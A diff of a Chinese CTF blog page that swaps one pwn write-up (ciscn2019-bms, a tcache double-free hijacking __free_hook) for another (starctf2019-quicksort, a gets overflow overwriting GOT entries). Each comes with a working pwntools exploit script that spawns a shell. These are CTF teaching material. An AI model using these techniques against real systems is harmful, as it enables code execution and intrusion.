@@ -108,24 +108,24 @@
 
 
 
-  <meta name="description" content="介绍国赛2019的最后一道题，涉及到了tcache，还是有一定难度的，堆布局挺烦的。">
+  <meta name="description" content="介绍starctf2019的一道题，漏洞很明显，但是不算很好利用。（其实是因为我的利用方式问题，下面会提到如何利用比较简单）">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ciscn2019-bms">
-<meta property="og:url" content="https://mf-x.github.io/2019/05/04/ciscn2019-bms/index.html">
+<meta property="og:title" content="starctf2019-quicksort">
+<meta property="og:url" content="https://mf-x.github.io/2019/05/04/starctf2019-quicksort/index.html">
 <meta property="og:site_name" content="ivan">
-<meta property="og:description" content="介绍国赛2019的最后一道题，涉及到了tcache，还是有一定难度的，堆布局挺烦的。">
+<meta property="og:description" content="介绍starctf2019的一道题，漏洞很明显，但是不算很好利用。（其实是因为我的利用方式问题，下面会提到如何利用比较简单）">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2019-05-04T03:35:46.878Z">
+<meta property="og:updated_time" content="2019-05-04T16:13:13.066Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="ciscn2019-bms">
-<meta name="twitter:description" content="介绍国赛2019的最后一道题，涉及到了tcache，还是有一定难度的，堆布局挺烦的。">
+<meta name="twitter:title" content="starctf2019-quicksort">
+<meta name="twitter:description" content="介绍starctf2019的一道题，漏洞很明显，但是不算很好利用。（其实是因为我的利用方式问题，下面会提到如何利用比较简单）">
 
 
 
 
 
 
-  <link rel="canonical" href="https://mf-x.github.io/2019/05/04/ciscn2019-bms/">
+  <link rel="canonical" href="https://mf-x.github.io/2019/05/04/starctf2019-quicksort/">
 
 
 
@@ -135,7 +135,7 @@
   };
 </script>
 
-  <title>ciscn2019-bms | ivan</title>
+  <title>starctf2019-quicksort | ivan</title>
   
 
 
@@ -329,7 +329,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://mf-x.github.io/2019/05/04/ciscn2019-bms/">
+    <link itemprop="mainEntityOfPage" href="https://mf-x.github.io/2019/05/04/starctf2019-quicksort/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="ivan Mo">
@@ -346,7 +346,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">ciscn2019-bms
+          <h1 class="post-title" itemprop="name headline">starctf2019-quicksort
               
             
           </h1>
@@ -371,12 +371,24 @@
                 
               
 
-              <time title="Created: 2019-05-04 10:54:13 / Modified: 11:35:46" itemprop="dateCreated datePublished" datetime="2019-05-04T10:54:13+08:00">2019-05-04</time>
+              <time title="Created: 2019-05-04 23:54:56" itemprop="dateCreated datePublished" datetime="2019-05-04T23:54:56+08:00">2019-05-04</time>
             
 
             
               
 
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2019-05-05 00:13:13" itemprop="dateModified" datetime="2019-05-05T00:13:13+08:00">2019-05-05</time>
               
             
           </span>
@@ -409,25 +421,18 @@
       
 
       
-        <h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>国赛2019的最后一道题，涉及到了tcache，还是有一定难度的，堆布局挺烦的。</p>
+        <h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>starctf2019的一道题，漏洞很明显，但是不算很好利用。（其实是因为我的利用方式问题，下面会提到如何利用比较简单）</p>
 <a id="more"></a>
-<h3 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h3><p>程序最开始有个登陆，简单分析一下可以知道账户admin，密码frame。</p>
-<p>然后是一个单选系统，只有add和delete，没有输出的地方，结构体如下。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00000000 node            struc ; (sizeof=0x20, mappedto_6)</span><br><span class="line">00000000 name            db 16 dup(?)</span><br><span class="line">00000010 des_addr        dq ?                    ; offset</span><br><span class="line">00000018 des_len         dq ?</span><br><span class="line">00000020 node            ends</span><br></pre></td></tr></table></figure>
-<p>漏洞出现在delete的时候，free之后没有将指针清零，也没有对index做检查，所以可以double free，但是只可以add十次。</p>
-<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><p><del>tcache在在2.29之前好像都没有做什么检查</del>，还是很好利用的，但是程序没有明显的泄漏的地方还是比较麻烦的，这里的做法是partial overwrite，将堆上残留的libc地址改成<code>__free_hook</code>的地址，需要爆破一位所以成功率为1/16，然后改写<code>__free_hook</code>为puts地址，就可以泄漏libc地址了，然后再次修改<code>__free_hook</code>为<code>system</code>即可getshell。</p>
-<p>这里详细讲解一下利用的过程：</p>
-<ol>
-<li>分配一个smallbin大小的堆块(0)，用于产生残留的libc地址，再分配一个fastbin(1)，因为后面会破坏free函数，所以这里提前free准备好一个double free</li>
-<li>free 8次0号堆块，此时unsortbin上会有一个堆块，且上面有残留的libc地址</li>
-<li>再次add一次，这次所add的node的堆块就是从unsortbin上剥离下来的，所以对name进行写，即可将上面残留的libc地址改写为<code>__free_hook</code>地址</li>
-<li>再次add两个和0号堆块一样大小的堆块(3,4)，4号堆块就会被malloc到<code>__free_hook</code>上，对4号堆块进行写入，即可将<code>__free_hook</code>的值改写为<code>elf.plt[&#39;puts&#39;]</code></li>
-<li>再次free 0号堆块，就会泄漏出libc的地址</li>
-<li>利用最开始准备的1号堆块，将<code>__free_hook</code>改写为<code>system</code>的地址</li>
-<li>分配一个堆块(8)，写上<code>/bin/sh</code>，free掉，即可调用<code>system(&quot;/bin/sh&quot;)</code></li>
+<h3 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h3><p>程序实现了快速排序，但是漏洞和它完全无关。漏洞点一眼就能看出来gets函数。但是程序开了Canary，所以直接溢出是肯定不行的，但是gets读到的s数组，下面还有很多变量，我们可以通过覆盖这些变量来进行一些操作。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int *tmp; // ebx</span><br><span class="line">char s[16]; // [esp+Ch] [ebp-2Ch]</span><br><span class="line">int num; // [esp+1Ch] [ebp-1Ch]</span><br><span class="line">int i; // [esp+20h] [ebp-18h]</span><br><span class="line">int j; // [esp+24h] [ebp-14h]</span><br><span class="line">int *data; // [esp+28h] [ebp-10h]</span><br><span class="line">unsigned int v6; // [esp+2Ch] [ebp-Ch]</span><br></pre></td></tr></table></figure>
+<p>我们可以在写s数组的时候，覆盖掉data指针，之后在对data进行写的时候就可以做到任意写了。</p>
+<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><ol>
+<li>覆盖data指针为got表，将free函数改写为sort_func，为了能再次跳回这个函数</li>
+<li>覆盖data指针为got表，打印结果时leak信息（此处重新覆盖是因为，排序函数会打乱got表，我们需要找一个不会影响后续程序的位置）</li>
+<li>覆盖data指针为got表，将atoi函数覆盖为system函数，即可getshell</li>
 </ol>
-<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><p>攻击方式只有1/16的成功率，所以做了个循环，但是alarm好像不起效，遇到脚本卡住，多crlt+c几次就好。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">'./pwn'</span></span><br><span class="line">lib = <span class="string">'/lib/x86_64-linux-gnu/libc-2.27.so'</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = ELF(lib)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name, size, desc)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;'</span>,<span class="string">'1'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'book name:'</span>,name)</span><br><span class="line">    p.sendafter(<span class="string">'description size:'</span>,str(size))</span><br><span class="line">    p.sendafter(<span class="string">'description:'</span>, desc)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;'</span>,<span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'index:'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    p = process(binary, alarm=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># login</span></span><br><span class="line">    p.sendline(<span class="string">'admin'</span>)</span><br><span class="line">    p.sendline(<span class="string">'frame'</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="string">'0'</span>,<span class="number">0x90</span>,<span class="string">'000000'</span>)</span><br><span class="line">    add(<span class="string">'1'</span>,<span class="number">0x10</span>,<span class="string">'111111'</span>)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="string">'\xe8\x98'</span>,<span class="number">0x20</span>,<span class="string">'\n'</span>) <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">    add(<span class="string">'3'</span>,<span class="number">0x90</span>,<span class="string">'\n'</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># free_hook -&gt; puts</span></span><br><span class="line">    add(<span class="string">'4'</span>,<span class="number">0x90</span>,p64(elf.plt[<span class="string">'puts'</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    leak = p.recv(<span class="number">6</span>)</span><br><span class="line">    libc.address = u64(leak.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - (<span class="number">0x7fe75414980a</span> - <span class="number">0x7fe753d5c000</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> (libc.address&gt;&gt;<span class="number">40</span>) == <span class="number">0x7f</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># free_hook -&gt; system</span></span><br><span class="line">    add(<span class="string">'5'</span>,<span class="number">0x10</span>,p64(libc.symbols[<span class="string">'__free_hook'</span>]))</span><br><span class="line">    add(<span class="string">'6'</span>,<span class="number">0x10</span>,p64(libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line">    add(<span class="string">'7'</span>,<span class="number">0x10</span>,p64(libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line"></span><br><span class="line">    add(<span class="string">'8'</span>,<span class="number">0x33</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">    delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        main()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+<p>注：其实后面才想到有比较简单的利用方式。即然都可以写got表了，直接将<code>__stack_chk_fail</code>改掉即可，这样canary检查就无效了，接着就是正常的rop完事。</p>
+<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">'./quicksort'</span></span><br><span class="line">lib = <span class="string">'/lib/i386-linux-gnu/libc-2.23.so'</span></span><br><span class="line">p = process(binary)</span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = ELF(lib)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'how many numbers do you want to sort?'</span>,<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'the 1th number:'</span>)</span><br><span class="line">p.sendline(<span class="string">'111'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'the 2th number:'</span>)</span><br><span class="line">sort_func = <span class="number">0x08048816</span></span><br><span class="line"><span class="comment"># data -&gt; elf.got['free']</span></span><br><span class="line"><span class="comment"># free -&gt; sort_func</span></span><br><span class="line">p.sendline(str(sort_func).ljust(<span class="number">16</span>,<span class="string">'\x00'</span>) + p32(<span class="number">2</span>) +p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(elf.got[<span class="string">'free'</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># data -&gt; elf.got['setbuf']</span></span><br><span class="line">p.recvuntil(<span class="string">'the 2th number:'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0</span>).ljust(<span class="number">16</span>,<span class="string">'\x00'</span>)+ p32(<span class="number">2</span>) + p32(<span class="number">1</span>) + p32(<span class="number">0</span>) + p32(elf.got[<span class="string">'setbuf'</span>] <span class="number">-8</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak</span></span><br><span class="line">p.recvuntil(<span class="string">'Here is the result:\n'</span>)</span><br><span class="line">leak = p.recvuntil(<span class="string">' '</span>)</span><br><span class="line">libc.address = <span class="number">0xffffffff</span> + int(leak) + <span class="number">1</span> - <span class="number">0x1ed918</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'how many numbers do you want to sort?'</span>,<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'the 1th number:'</span>)</span><br><span class="line"><span class="comment"># data -&gt; elf.got['atoi']</span></span><br><span class="line"><span class="comment"># atoi -&gt; system</span></span><br><span class="line">p.sendline(str(libc.symbols[<span class="string">'system'</span>] - <span class="number">0xffffffff</span> - <span class="number">1</span>).ljust(<span class="number">16</span>,<span class="string">'\x00'</span>) + p32(<span class="number">2</span>) +p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(elf.got[<span class="string">'atoi'</span>]))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'the 2th number:'</span>)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -455,8 +460,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/05/03/ciscn2019-Virtual/" rel="next" title="ciscn2019-Virtual">
-                <i class="fa fa-chevron-left"></i> ciscn2019-Virtual
+              <a href="/2019/05/04/ciscn2019-bms/" rel="next" title="ciscn2019-bms">
+                <i class="fa fa-chevron-left"></i> ciscn2019-bms
               </a>
             
           </div>
@@ -464,10 +469,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/05/04/starctf2019-quicksort/" rel="prev" title="starctf2019-quicksort">
-                starctf2019-quicksort <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
